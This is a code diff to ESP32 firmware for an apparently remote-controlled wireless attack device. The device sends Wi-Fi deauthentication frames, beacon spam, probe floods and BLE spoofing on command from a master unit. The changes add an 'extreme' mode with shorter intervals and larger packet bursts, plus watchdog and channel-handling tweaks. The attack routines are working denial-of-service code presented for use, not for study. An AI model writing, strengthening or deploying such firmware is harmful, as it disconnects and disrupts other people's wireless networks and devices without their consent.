@@ -36,6 +36,7 @@ typedef struct struct_message {
 struct_message myData;
 
 bool attackRunning = false;
+bool extremeMode = false;
 String currentAttack = "";
 uint8_t masterMacAddress[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 bool hasMasterMac = false;
@@ -125,6 +126,11 @@ float getBoardTemp() {
 void sendLogToMaster(const char* logMsg) {
   if (!hasMasterMac) return;
   
+  uint8_t primaryChan;
+  wifi_second_chan_t secondChan;
+  esp_wifi_get_channel(&primaryChan, &secondChan);
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  
   struct_message response = {0};
   strlcpy(response.command, "log", sizeof(response.command));
   strlcpy(response.attack, "", sizeof(response.attack));
@@ -134,6 +140,7 @@ void sendLogToMaster(const char* logMsg) {
   XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
   
   for (int retry = 0; retry < 3; retry++) {
+    esp_task_wdt_reset();
     esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
     if (result == ESP_OK) {
       break;
@@ -141,6 +148,8 @@ void sendLogToMaster(const char* logMsg) {
     Serial.printf("[ESP-NOW] Failed to send log to Master (attempt %d/3), err: %d\n", retry + 1, result);
     delay(5);
   }
+  
+  esp_wifi_set_channel(primaryChan, secondChan);
 }
 
 // ===== LED STATUS BLINKER =====
@@ -221,20 +230,19 @@ void runBeaconSpamStep(bool boost) {
   esp_wifi_set_promiscuous(true);
   
   static unsigned long lastBeaconHopTime = 0;
-  int hopInterval = boost ? 150 : 300;
+  int hopInterval = boost ? (extremeMode ? 100 : 300) : 500;
   if (millis() - lastBeaconHopTime >= hopInterval) {
     lastBeaconHopTime = millis();
     hopChannel();
     
     // Send a burst of beacons for multiple SSIDs on this channel
-    int burstSize = boost ? 40 : 15;
+    int burstSize = boost ? (extremeMode ? 60 : 20) : 10;
     for (int i = 0; i < burstSize; i++) {
       char ssidBuf[32];
       getRealisticSSID(ssidBuf, ssidIndex);
       sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
       yield();
       ssidIndex = (ssidIndex + 1) % 100;
-      esp_task_wdt_reset();
       yield();
     }
     
@@ -274,7 +282,7 @@ void sendDeauthFrame(const uint8_t* apBssid, const uint8_t* clientMac, uint16_t 
 void runDeauthStep(bool boost) {
   esp_wifi_set_promiscuous(true);
   
-  if (millis() - lastAttackActionTime >= (boost ? 5 : 15)) {
+  if (millis() - lastAttackActionTime >= (boost ? (extremeMode ? 2 : 5) : 15)) {
     lastAttackActionTime = millis();
     
     uint8_t targetBSSID[6];
@@ -296,7 +304,7 @@ void runDeauthStep(bool boost) {
       targetBSSID[0] |= 0x02;
     }
 
-    int burstSize = boost ? 10 : 3;
+    int burstSize = boost ? (extremeMode ? 15 : 5) : 2;
     uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     
     for (int i = 0; i < burstSize; i++) {
@@ -318,7 +326,6 @@ void runDeauthStep(bool boost) {
       
       clientPacket[0] = 0xA0;
       esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
-      esp_task_wdt_reset();
       yield();
     }
     
@@ -373,7 +380,6 @@ void runProbeFloodStep() {
     pos += ssidLen;
 
     esp_wifi_80211_tx(WIFI_IF_STA, probePacket, pos, false);
-    esp_task_wdt_reset();
     
     if (random(100) == 0) {
       sendLogToMaster("[Probe] Flooding active scan requests (ch 1-13)");
@@ -590,6 +596,7 @@ void startWiFiScan() {
   
   // Hop through channels 1 to 13
   for (int ch = 1; ch <= 13; ch++) {
+    yield();
     esp_task_wdt_reset();
     if (!attackRunning) break;
     currentChannel = ch;
@@ -600,9 +607,9 @@ void startWiFiScan() {
     
     // Sniff for 200ms on this channel (in 10ms steps to check attackRunning)
     for (int step = 0; step < 20; step++) {
+      yield();
       if (!attackRunning) break;
       delay(10);
-      esp_task_wdt_reset();
       yield();
     }
     if (!attackRunning) break;
@@ -612,7 +619,6 @@ void startWiFiScan() {
     // Report APs found on this channel
     for (int i = 0; i < apCount; i++) {
       if (!attackRunning) break;
-      esp_task_wdt_reset();
       yield();
       if (apList[i].channel == ch) {
         char macStr[20];
@@ -703,6 +709,7 @@ void startBLEScan() {
   
   for (int i = 0; i < min((int)foundDevices->getCount(), 15); i++) {
     yield();
+    esp_task_wdt_reset();
     BLEAdvertisedDevice device = foundDevices->getDevice(i);
     String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
     String devAddr = device.getAddress().toString().c_str();
@@ -716,7 +723,6 @@ void startBLEScan() {
     delay(50);
   }
   pBLEScan->clearResults();
-  delete foundDevices;
 }
 
 void startBLESpoofer() {
@@ -822,7 +828,6 @@ void startGhzScan() {
   BLEScanResults *foundDevices = pBLEScan->start(2, false);
   int bleCount = foundDevices ? foundDevices->getCount() : 0;
   pBLEScan->clearResults();
-  delete foundDevices;
   
   // 3. Compile report
   sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
@@ -966,7 +971,6 @@ void startIRScan() {
   bool captured = false;
   
   while (millis() - startTime < 6000) { // Scan for 6 seconds
-    esp_task_wdt_reset();
     if (digitalRead(IR_RX_PIN) == LOW) { // IR receiver output active-low
       unsigned long lowPulse = pulseIn(IR_RX_PIN, LOW, 15000);
       unsigned long highPulse = pulseIn(IR_RX_PIN, HIGH, 15000);
@@ -977,7 +981,6 @@ void startIRScan() {
         bool ok = true;
         
         for (int i = 0; i < 32; i++) {
-          esp_task_wdt_reset();
           unsigned long bitLow = pulseIn(IR_RX_PIN, LOW, 2000);
           unsigned long bitHigh = pulseIn(IR_RX_PIN, HIGH, 2000);
           
@@ -1055,6 +1058,7 @@ void stopAttack() {
     XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
     
     for (int retry = 0; retry < 3; retry++) {
+      esp_task_wdt_reset();
       esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
       if (result == ESP_OK) {
         break;
@@ -1092,6 +1096,7 @@ void sendPong(const uint8_t *masterMac) {
   XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
   
   for (int retry = 0; retry < 3; retry++) {
+    esp_task_wdt_reset();
     esp_err_t result = esp_now_send(masterMac, (uint8_t *)&response, sizeof(response));
     if (result == ESP_OK) {
       break;
@@ -1190,8 +1195,13 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
 void setup() {
   Serial.begin(115200);
   randomSeed(esp_random());
-  esp_task_wdt_config_t wdt_config = { .timeout_ms = 15000, .idle_core_mask = (1 << 0) | (1 << 1), .trigger_panic = true };
+  // WDT 30 секунд — перезагрузка при зависании
+#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
+  esp_task_wdt_config_t wdt_config = { .timeout_ms = 30000, .idle_core_mask = (1 << 0) | (1 << 1), .trigger_panic = true };
   esp_task_wdt_init(&wdt_config);
+#else
+  esp_task_wdt_init(30, true);
+#endif
   esp_task_wdt_add(NULL);
   
   pinMode(LED_PIN, OUTPUT);
@@ -1247,8 +1257,8 @@ void setup() {
 
 // ===== LOOP =====
 void loop() {
-  esp_task_wdt_reset();
   updateLedIndicator();
+  esp_task_wdt_reset();
   
   // Safety timeout: stop attack if Master connection is lost for >15 seconds
   if (attackRunning && hasMasterMac && (millis() - lastMasterHeardTime > 15000)) {
@@ -1268,14 +1278,21 @@ void loop() {
       while (millis() - startListen < 500) {
         delay(1); 
         yield();
+        esp_task_wdt_reset();
       }
       
       lastListenTime = millis();
       if (!attackRunning) return; // Exit if stopped during listening window
     }
     
-    bool boost = currentAttack.endsWith("_boost");
-    String baseAttackName = boost ? currentAttack.substring(0, currentAttack.length() - 6) : currentAttack;
+    bool boost = currentAttack.endsWith("_boost") || currentAttack.endsWith("_extreme");
+    extremeMode = currentAttack.endsWith("_extreme");
+    String baseAttackName = currentAttack;
+    if (extremeMode) {
+      baseAttackName = currentAttack.substring(0, currentAttack.length() - 8); // strip "_extreme"
+    } else if (boost) {
+      baseAttackName = currentAttack.substring(0, currentAttack.length() - 6); // strip "_boost"
+    }
     
     if (baseAttackName == "beacon") {
       runBeaconSpamStep(boost);
